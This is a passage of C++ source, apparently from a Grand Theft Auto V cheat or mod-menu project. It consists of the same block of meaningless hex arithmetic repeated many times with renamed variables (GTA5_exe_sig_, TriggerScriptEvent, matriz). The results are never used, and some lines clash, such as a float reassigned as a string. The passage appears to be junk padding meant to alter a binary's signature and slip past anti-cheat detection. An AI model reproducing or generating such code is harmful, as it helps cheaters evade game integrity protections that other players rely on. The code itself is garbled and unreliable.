							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<Pitch>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
